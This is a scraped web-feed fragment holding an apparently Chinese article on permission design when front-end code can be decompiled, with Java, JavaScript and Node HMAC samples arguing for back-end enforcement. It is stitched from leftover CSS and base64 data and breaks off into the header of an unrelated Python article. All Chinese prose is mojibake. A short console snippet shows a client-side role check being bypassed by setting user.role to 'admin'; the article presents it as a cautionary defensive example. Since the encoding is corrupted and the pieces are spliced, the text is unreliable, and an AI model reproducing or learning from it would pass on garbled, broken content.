SLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ç°ä»£ Web åº”ç”¨ä¸­ï¼Œ<strong>å®‰å…¨ä¸æƒé™è®¾è®¡</strong> æ˜¯æ¶æ„ä¸­æœ€å®¹æ˜“è¢«å¿½è§†ã€å´æœ€å®¹æ˜“å‡ºé—®é¢˜çš„éƒ¨åˆ†ã€‚<br/>
éšç€å‰ç«¯åº”ç”¨çš„å¤æ‚åº¦ä¸æ–­æé«˜ï¼ˆVueã€Reactã€Flutter Web ç­‰ï¼‰ï¼Œè¶Šæ¥è¶Šå¤šé€»è¾‘è¢«æ”¾åœ¨å®¢æˆ·ç«¯æ‰§è¡Œï¼›<br/>
ä¸æ­¤åŒæ—¶ï¼Œæ‰“åŒ…åçš„å‰ç«¯ä»£ç å¯è¢«è½»æ˜“â€œåç¼–è¯‘â€ã€â€œé€†å‘åˆ†æâ€æˆ–ç›´æ¥åœ¨æµè§ˆå™¨ä¸­ç¯¡æ”¹ã€‚</p>
<p>äºæ˜¯ï¼Œå¼€å‘è€…å¸¸é¢ä¸´ä¸€ä¸ªæ£˜æ‰‹é—®é¢˜ï¼š</p>
<blockquote>
<p>ã€Œå½“ç”¨æˆ·å¯ä»¥ç›´æ¥æŸ¥çœ‹ã€ä¿®æ”¹ã€ç”šè‡³æ³¨å…¥å‰ç«¯é€»è¾‘æ—¶ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•ä¿éšœæƒé™ä½“ç³»çš„å®‰å…¨æ€§ï¼Ÿã€</p>
</blockquote>
<p>æœ¬æ–‡å°†ç³»ç»Ÿåˆ†æ <strong>åç¼–è¯‘ç¯å¢ƒä¸‹æƒé™è®¾è®¡çš„é£é™©ä¸é˜²æŠ¤æœºåˆ¶</strong>ï¼Œé€šè¿‡æ¶æ„åˆ†å±‚æ€è·¯ï¼Œ<br/>
æ„å»ºä¸€ä¸ªå‰åç«¯ç»Ÿä¸€ã€å®‰å…¨å¯æ§çš„æƒé™é˜²æŠ¤ä½“ç³»ï¼Œå¹¶æä¾›å®è·µä»£ç ä¸å·¥ç¨‹å»ºè®®ã€‚</p>
<hr/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f136ab89966405c858f127a85d954e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTGVvbkdhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771137350&amp;x-signature=OrhcZhqf%2F91h7ZTzDxqsJqWUCL4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸€ã€é—®é¢˜å®šä¹‰ä¸èƒŒæ™¯</h2>
<h3 data-id="heading-2">1. å‰ç«¯åç¼–è¯‘ï¼šå®‰å…¨çš„å‡è±¡</h3>
<p>å‰ç«¯ç¼–è¯‘äº§ç‰©ï¼ˆHTMLã€JSã€CSSï¼‰æœ€ç»ˆéƒ½éœ€è¿è¡Œåœ¨ç”¨æˆ·ç«¯ã€‚<br/>
å³ä½¿ä½¿ç”¨äº† Webpackã€Viteã€Uglify è¿›è¡Œæ··æ·†æ‰“åŒ…ï¼Œæ”»å‡»è€…ä»å¯é€šè¿‡å¦‚ä¸‹æ–¹å¼åˆ†ææºç ï¼š</p>
<ul>
<li>æ‰“å¼€ <strong>æµè§ˆå™¨å¼€å‘è€…å·¥å…·</strong> æŸ¥çœ‹é€»è¾‘ï¼›</li>
<li>ä½¿ç”¨ <strong>åæ··æ·†å·¥å…·</strong> è¿˜åŸå‡½æ•°ä¸æ¨¡å—ï¼›</li>
<li>ç›´æ¥ <strong>ä¿®æ”¹å…¨å±€å˜é‡ç»•è¿‡æ¡ä»¶åˆ¤æ–­</strong>ï¼›</li>
<li>ä½¿ç”¨ <strong>æŠ“åŒ…å·¥å…·ï¼ˆå¦‚ Burpã€Postmanï¼‰</strong> æ¨¡æ‹Ÿæ¥å£è°ƒç”¨ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€ï¼š<br/>
å‰ç«¯çš„æƒé™åˆ¤æ–­ã€ä»¤ç‰ŒéªŒè¯æˆ–è§’è‰²é™åˆ¶â€”â€”å¦‚æœ<strong>ä¸ç”±åç«¯å¤æ ¸</strong>ï¼Œ<br/>
éƒ½å¯ä»¥è¢«é€šè¿‡ç¯¡æ”¹è„šæœ¬çš„æ–¹å¼ç»•è¿‡ã€‚</p>
<h3 data-id="heading-3">2. æ¡ˆä¾‹ï¼šè¢«ç¯¡æ”¹çš„å‰ç«¯æƒé™</h3>
<p>é”™è¯¯ç¤ºä¾‹ï¼ˆå‰ç«¯åˆ¤æ–­ç®¡ç†å‘˜èº«ä»½ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">user.role</span> === <span class="hljs-string">'admin'</span>) {
  showAdminPanel()<span class="hljs-comment">;</span>
}
</code></pre>
<p>æ”»å‡»è€…åœ¨æµè§ˆå™¨æ§åˆ¶å°ç›´æ¥æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">user.role</span> = <span class="hljs-string">'admin'</span><span class="hljs-comment">;</span>
showAdminPanel()<span class="hljs-comment">;</span>
</code></pre>
<p>å³å¯è§£é”ã€Œç®¡ç†å‘˜é¢æ¿ã€ã€‚<br/>
ä½†å¦‚æœåç«¯æ¥å£æ²¡æœ‰äºŒæ¬¡éªŒè¯ï¼Œé‚£ä¹ˆçœŸæ­£çš„å±é™©åœ¨äºï¼š<strong>ä»–èƒ½è°ƒç”¨åå°ç®¡ç† API åˆ é™¤æ•°æ®ã€‚</strong></p>
<hr/>
<h2 data-id="heading-4">äºŒã€å®‰å…¨æƒé™è®¾è®¡çš„æ ¸å¿ƒåŸåˆ™</h2>
<ol>
<li>
<p><strong>å‰ç«¯å±•ç¤ºï¼Œåç«¯å†³ç­–</strong></p>
<ul>
<li>å‰ç«¯åªèƒ½æ§åˆ¶ UI æ˜¯å¦æ˜¾ç¤ºæŸä¸ªæŒ‰é’®ï¼Œä¸åº”å†³å®šã€Œæ˜¯å¦å…è®¸æ‰§è¡ŒåŠ¨ä½œã€ã€‚</li>
<li>æ‰€æœ‰ä¸å®‰å…¨ç›¸å…³çš„é€»è¾‘ï¼ˆå¢åˆ æ”¹ã€æ•°æ®æŸ¥è¯¢ï¼‰å¿…é¡»ç”±åç«¯éªŒè¯ã€‚</li>
</ul>
</li>
<li>
<p><strong>æœåŠ¡ç«¯å¿…é¡»éªŒè¯æƒé™ + ç­¾å</strong></p>
<ul>
<li>åç«¯æ˜¯ã€Œå”¯ä¸€å¯ä¿¡ç¯å¢ƒã€ï¼Œåº”éªŒè¯è¯·æ±‚æ¥æºã€ç­¾åã€è§’è‰²ã€Tokenã€‚</li>
</ul>
</li>
<li>
<p><strong>æƒé™æ˜¯ã€Œè¢«åŠ¨åˆ¤å®šã€ï¼Œä¸æ˜¯ã€Œä¸»åŠ¨è®°å¿†ã€</strong></p>
<ul>
<li>ä¸ä¾èµ–å‰ç«¯æœ¬åœ°çŠ¶æ€ï¼ˆå¦‚ localStorageï¼‰ï¼›</li>
<li>æ¯æ¬¡è¯·æ±‚éƒ½åœ¨åç«¯é‡æ–°éªŒè¯èº«ä»½ã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€å®‰å…¨æƒé™é˜²æŠ¤çš„åˆ†å±‚æ¶æ„</h2>
<p>ä¸ºäº†å®ç°å®‰å…¨çš„åˆ†å¸ƒå¼æƒé™ä½“ç³»ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç³»ç»Ÿåˆ’åˆ†ä¸ºå…­å±‚ï¼š</p>








































<table><thead><tr><th>å±‚çº§</th><th>æè¿°</th><th>æ ¸å¿ƒé˜²æŠ¤ç­–ç•¥</th></tr></thead><tbody><tr><td><strong>â‘  å‰ç«¯å±•ç¤ºå±‚</strong></td><td>Vue / React åº”ç”¨</td><td>ä»…å±•ç¤ºåŠŸèƒ½ï¼Œä¸å­˜å‚¨é€»è¾‘ï¼›é™åˆ¶ Token æš´éœ²</td></tr><tr><td><strong>â‘¡ æ¥å…¥ä¸ç½‘å…³å±‚</strong></td><td>Nginx / Kong / API Gateway</td><td>é™æµã€é˜²çˆ¬ï¼›éªŒè¯ Token ç­¾åï¼›è¯·æ±‚æ—¥å¿—</td></tr><tr><td><strong>â‘¢ é‰´æƒæœåŠ¡å±‚</strong></td><td>OAuth2 / SSO Server</td><td>ç™»å½•æ€éªŒè¯ï¼›è§’è‰²ä¸ç§Ÿæˆ·åˆ¤æ–­ï¼›é¢å‘ JWT</td></tr><tr><td><strong>â‘£ èµ„æºæœåŠ¡å±‚</strong></td><td>å„ä¸šåŠ¡æ¨¡å—æœåŠ¡</td><td>æ ¸å¿ƒé€»è¾‘æ ¡éªŒï¼šRBAC / ABAC æƒé™åŒ¹é…</td></tr><tr><td><strong>â‘¤ æ•°æ®ä¸å®¡è®¡å±‚</strong></td><td>Databaseã€Redisã€ELK</td><td>è„±æ•ã€æœ€å°è®¿é—®ç­–ç•¥ã€æ“ä½œç•™ç—•</td></tr><tr><td><strong>â‘¥ å®‰å…¨ç›‘æ§å±‚</strong></td><td>SIEMã€Prometheus</td><td>é£æ§æ£€æµ‹ã€å‘Šè­¦ç­–ç•¥ã€å¼‚å¸¸åˆ†æ</td></tr></tbody></table>
<h3 data-id="heading-6">æ¶æ„å›¾</h3>
<p>ä¸‹å›¾å±•ç¤ºäº†å®Œæ•´é˜²æŠ¤åˆ†å±‚ç»“æ„ï¼ˆæ•°æ®æµç”±ä¸Šè‡³ä¸‹ï¼‰ï¼š</p>
<pre><code class="hljs language-css" lang="css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          å®‰å…¨ç›‘æ§å±‚ï¼ˆSIEM/é£æ§ï¼‰     â”‚
â”‚  â€¢ ç™»å½•å¼‚å¸¸æ£€æµ‹  â€¢ æ”»å‡»å‘Šè­¦åˆ†æ     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â–²
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          æ•°æ®ä¸å®¡è®¡å±‚               â”‚
â”‚  â€¢ æ•°æ®æœ€å°æƒé™è®¿é—®                â”‚
â”‚  â€¢ å®¡è®¡æ—¥å¿—ä¸å®‰å…¨è¿½è¸ª              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â–²
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          èµ„æºæœåŠ¡å±‚ï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰      â”‚
â”‚  â€¢ æ¥å£çº§æƒé™æ§åˆ¶ï¼ˆ<span class="hljs-keyword">@RoleBasedAccess</span>ï¼‰â”‚
â”‚  â€¢ é˜²è¶Šæƒã€æ“ä½œå®¡è®¡                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â–²
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          é‰´æƒæœåŠ¡å±‚ï¼ˆSSOï¼‰           â”‚
â”‚  â€¢ TokenéªŒè¯ã€è§’è‰²å‘æ”¾              â”‚
â”‚  â€¢ åŠ¨æ€æˆæƒã€ç§Ÿæˆ·éš”ç¦»               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â–²
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          æ¥å…¥ç½‘å…³å±‚ï¼ˆAPI Gatewayï¼‰   â”‚
â”‚  â€¢ é™æµã€é˜²çˆ¬ã€é˜²åˆ·                â”‚
â”‚  â€¢ HMACç­¾åéªŒè¯                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â–²
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          å‰ç«¯å±•ç¤ºå±‚ï¼ˆéä¿¡ä»»åŒºï¼‰      â”‚
â”‚  â€¢ ä»…å±•ç¤ºUIã€è¯»å–Tokenæé†’ç”¨æˆ·ç™»å½•   â”‚
â”‚  â€¢ ç¦æ­¢ä¸šåŠ¡é€»è¾‘åœ¨æœ¬åœ°æ‰§è¡Œ           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h2 data-id="heading-7">å››ã€æŠ€æœ¯å®ç°</h2>
<h3 data-id="heading-8">1. åç«¯è§’è‰²æƒé™æ³¨è§£ç¤ºä¾‹</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// è‡ªå®šä¹‰æ³¨è§£</span>
<span class="hljs-variable">@Target</span>(ElementType.METHOD)
<span class="hljs-variable">@Retention</span>(RetentionPolicy.RUNTIME)
public <span class="hljs-variable">@interface</span> RoleCheck {
    <span class="hljs-selector-tag">String</span><span class="hljs-selector-attr">[]</span> <span class="hljs-selector-tag">value</span>();
}
</code></pre>

<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‹¦æˆªå™¨å®ç°</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RoleInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res, Object handler)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">"Authorization"</span>);
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> TokenService.verify(token);
        <span class="hljs-type">RoleCheck</span> <span class="hljs-variable">check</span> <span class="hljs-operator">=</span> ((HandlerMethod) handler).getMethodAnnotation(RoleCheck.class);
        <span class="hljs-keyword">if</span> (check != <span class="hljs-literal">null</span> &amp;&amp; !user.hasAnyRole(check.value())) {
            res.setStatus(HttpServletResponse.SC_FORBIDDEN);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<blockquote>
<p>ğŸ” å³ä¾¿æ”»å‡»è€…æ¨¡æ‹Ÿè¯·æ±‚æˆ–åç¼–è¯‘å‰ç«¯ï¼Œä¹Ÿæ— æ³•ç»•è¿‡åç«¯è§’è‰²è®¤è¯ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">2. å‰ç«¯ï¼šåŸºäºæƒé™çš„æ˜¾ç¤ºæ§åˆ¶ï¼ˆéé€»è¾‘æ§åˆ¶ï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini">// å‡è®¾åç«¯è¿”å›çš„è§’è‰²ä¸º <span class="hljs-section">['user']</span>
const <span class="hljs-attr">userRoles</span> = [<span class="hljs-string">'user'</span>]<span class="hljs-comment">;</span>

const <span class="hljs-attr">routes</span> = [
  { name: <span class="hljs-string">'Dashboard'</span>, meta: { role: [<span class="hljs-string">'user'</span>, <span class="hljs-string">'admin'</span>] } },
  { name: <span class="hljs-string">'SystemConfig'</span>, meta: { role: [<span class="hljs-string">'admin'</span>] } }
]<span class="hljs-comment">;</span>

// ä»…å‰ç«¯æ¸²æŸ“æ§åˆ¶
const <span class="hljs-attr">visibleRoutes</span> = routes.filter(route =&gt;
  route.meta.role.some(<span class="hljs-attr">role</span> =&gt; userRoles.includes(role))
)<span class="hljs-comment">;</span>
</code></pre>
<blockquote>
<p>ä»…å½±å“ UI å±•ç¤ºï¼Œä¸å½±å“æ¥å£å¯è®¿é—®æ€§ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-10">3. é˜²åç¼–è¯‘ä¸æ”»å‡»åŠ å›º</h3>



































<table><thead><tr><th>æ”»å‡»æ–¹å¼</th><th>é˜²æŠ¤æªæ–½</th><th>å®è·µå·¥å…·</th></tr></thead><tbody><tr><td>æ‰“åŒ…JSè¢«é€†å‘</td><td>æ··æ·†ä¸ä»£ç å‹ç¼©</td><td><code>terser</code>, <code>webpack-obfuscator</code></td></tr><tr><td>Tokenç¯¡æ”¹</td><td>æœåŠ¡ç­¾åéªŒè¯ã€çŸ­æ—¶æ•ˆJWT</td><td>Redis / JWT RFC7519</td></tr><tr><td>æ¨¡æ‹Ÿæ¥å£</td><td>è¯·æ±‚ç­¾åï¼ˆHMAC / Nonceï¼‰</td><td>Nginx + Auth Filter</td></tr><tr><td>è°ƒè¯•æ³¨å…¥</td><td>Content-Security-Policy (CSP)</td><td>HTTP å®‰å…¨ç­–ç•¥å¤´</td></tr><tr><td>é‡æ”¾æ”»å‡»</td><td>æ—¶é—´æˆ³ + éšæœºNonceéªŒè¯</td><td>Redisç¼“å­˜æ ¡éªŒ</td></tr></tbody></table>
<p><strong>ç­¾åéªŒè¯ç¤ºä¾‹ï¼ˆNode.js HMACï¼‰</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> crypto <span class="hljs-keyword">from</span> <span class="hljs-string">'crypto'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">signRequest</span>(<span class="hljs-params">payload, secret, timestamp</span>) {
  <span class="hljs-keyword">const</span> base = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload) + timestamp;
  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHmac</span>(<span class="hljs-string">'sha256'</span>, secret).<span class="hljs-title function_">update</span>(base).<span class="hljs-title function_">digest</span>(<span class="hljs-string">'hex'</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-11">äº”ã€è®¾è®¡ä¼˜ç¼ºç‚¹åˆ†æ</h2>





























<table><thead><tr><th>æ¨¡å‹</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚åˆåœºæ™¯</th></tr></thead><tbody><tr><td><strong>å‰ç«¯åˆ¤æ–­æƒé™</strong></td><td>ç®€å•ã€ä½“éªŒå¥½</td><td>æ˜“è¢«ç»•è¿‡ã€ä¸å®‰å…¨</td><td>ä»…ç”¨äº UI æ§åˆ¶</td></tr><tr><td><strong>åç«¯æ ¡éªŒæƒé™</strong></td><td>å®‰å…¨ã€é›†ä¸­ç®¡ç†</td><td>å¼€é”€ç¨é«˜ã€å“åº”æ»å</td><td>æ ¸å¿ƒä¸šåŠ¡æ¥å£</td></tr><tr><td><strong>åˆ†å±‚æ¶æ„æƒé™ä½“ç³»</strong></td><td>å®‰å…¨ä¸æ•ˆç‡å¹³è¡¡</td><td>æ¶æ„å¤æ‚ã€éœ€æ²»ç†</td><td>ä¼ä¸šçº§ä¸­å¤§å‹ç³»ç»Ÿ</td></tr></tbody></table>
<blockquote>
<p>âœ… æ¨èæ··åˆæ¶æ„ï¼šå‰ç«¯ä¿éšœä½“éªŒï¼Œåç«¯ä¿éšœå®‰å…¨ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">å…­ã€ç»“è®º</h2>
<p>åœ¨ Web åç¼–è¯‘å‡ ä¹æ— æ³•é¿å…çš„æ—¶ä»£ï¼Œ<strong>å®‰å…¨æ˜¯ç­–ç•¥ï¼Œä¸æ˜¯å¹»è§‰</strong>ã€‚</p>
<p>æƒé™æ§åˆ¶è¦ä»ã€Œä¿¡ä»»å‰ç«¯ã€è½¬å˜ä¸ºã€Œå‰åç«¯ååŒã€ã€‚<br/>
åªè¦ä¿æŒä»¥ä¸‹ä¸‰ç‚¹ï¼Œä½ çš„æƒé™ä½“ç³»å°±èƒ½åœ¨å¤æ‚çš„å®‰å…¨å½¢åŠ¿ä¸‹ç«‹äºä¸è´¥ä¹‹åœ°ï¼š</p>
<ol>
<li><strong>ä¸€åˆ‡æˆæƒæœ€ç»ˆè½åœ°åç«¯ï¼›</strong></li>
<li><strong>æ‰€æœ‰æ•æ„Ÿé€»è¾‘çš†å¯å®¡è®¡ï¼›</strong></li>
<li><strong>å‰åç«¯ä¹‹é—´çš„ä¿¡ä»»å…³ç³»å¯éªŒè¯ã€å¯æ’¤é”€ã€‚</strong></li>
</ol>
<p>æœªæ¥ï¼Œä¼´éš <strong>é›¶ä¿¡ä»»æ¶æ„ï¼ˆZero Trustï¼‰</strong> ä¸ <strong>åŠ¨æ€ç­–ç•¥æˆæƒï¼ˆPolicy-based Access Control, PBACï¼‰</strong> çš„å…´èµ·ï¼Œ<br/>
æƒé™å®‰å…¨å°†æ›´åŠ æ™ºèƒ½ä¸åˆ†å¸ƒåŒ–ã€‚å®‰å…¨ä»æ­¤ä¸æ˜¯é™„åŠ ï¼Œè€Œå°†æˆä¸ºä¸šåŠ¡æœ¬èº«çš„ä¸€éƒ¨åˆ†ã€‚</p>
<hr/>
<h2 data-id="heading-13">ä¸ƒã€å‚è€ƒèµ„æ–™</h2>
<ol>
<li>[OWASP Top 10 2021: Broken Access Control]</li>
<li>[Spring Security Reference Documentation]</li>
<li>[MDN Web Docs: Content Security Policy (CSP)]</li>
<li>[RFC 7519 â€“ JSON Web Token (JWT)]</li>
<li>[Zero Trust Architecture â€“ NIST SP 800-207]</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python å¼‚æ­¥ç”Ÿå­˜æ‰‹å†Œï¼šç»™è¢« JS async/await å® åçš„å…¨æ ˆå·¥ç¨‹å¸ˆ]]></title>    <link>https://juejin.cn/post/7603688142005354505</link>    <guid>https://juejin.cn/post/7603688142005354505</guid>    <pubDate>2026-02-08T11:54:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603688142005354505" data-draft-id="7603946518372581414" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python å¼‚æ­¥ç”Ÿå­˜æ‰‹å†Œï¼šç»™è¢« JS async/await å® åçš„å…¨æ ˆå·¥ç¨‹å¸ˆ"/> <meta itemprop="keywords" content="åç«¯,Python"/> <meta itemprop="datePublished" content="2026-02-08T11:54:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å…‰å¤´è€çŸ³"/> <meta itemprop="url" content="https://juejin.cn/user/2963939077135006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python å¼‚æ­¥ç”Ÿå­˜æ‰‹å†Œï¼šç»™è¢« JS async/await å® åçš„å…¨æ ˆå·¥ç¨‹å¸ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939077135006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å…‰å¤´è€çŸ³
